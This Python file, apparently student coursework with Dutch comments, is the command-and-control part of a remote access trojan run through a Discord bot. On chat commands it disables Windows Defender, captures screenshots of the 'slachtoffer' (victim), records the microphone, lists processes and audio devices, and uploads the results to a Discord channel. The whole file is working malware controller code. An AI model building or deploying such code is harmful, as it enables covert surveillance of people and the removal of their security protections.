import discord
import dotenv
import time
from week_1.disable_defender import show_running_processes, disable_defender
from week_3.mic.record_mic import record_mic, list_audio_devices
from week_3.take_screenshot import take_screenshot
# laden van env variables1
DISCORD_BOT_ID = dotenv.get_key("week_2/.env", "DISCORD_BOT_ID")
DISCORD_SERVER_NAME = dotenv.get_key("week_2/.env", "DISCORD_SERVER_NAME")


def start_bot():
    intents = discord.Intents.default()
    intents.message_content = True

    client = discord.Client(intents=intents)

    @client.event
    async def on_ready():
        for guild in client.guilds:
            if guild.name == DISCORD_SERVER_NAME:
                break
        print(f"Client: {client.user}\n Guild: {
              guild.id}, Guild Name: {guild.name}")

    @client.event
    async def on_message(message):
        if message.author == client.user:
            return
        if message.content.startswith('$help'):
            await message.channel.send('commands: $dd: disables windows defender\n $ps: shows running processes')

        if message.content.startswith('$dd'):
            await message.channel.send(disable_defender())

        if message.content.startswith('$ps'):
            result = show_running_processes()
            with open("process_list.txt", 'w') as file:
                file.write(result)
            time.sleep(1)
            await message.channel.send("Draaiende processen ", file=discord.File("process_list.txt"))

        elif message.content.startswith('$ts'):
            take_screenshot()
            await message.channel.send("Screenshot van slachtoffer genomen: ", file=discord.File("screenshot.png"))

        elif message.content.startswith('$rm'):
            record_mic()
            await message.channel.send(".Wav file opgenomen van microfoon: ", file=discord.File("output.wav"))

        elif message.content.startswith('$la'):
            result = list_audio_devices()
            if type(result) is dict:
                str_devices = "gevonden audio apparaten:\n"
                for id, name in result.items():
                    str_devices += f"id:{id}, naam: {name}"
                await message.channel.send(str_devices)
            else:
                await message.channel.send(f"Er ging iets mis tijdens het ophalen van de apparaten: {result}")

    client.run(DISCORD_BOT_ID)


if __name__ == '__main__':
    start_bot()
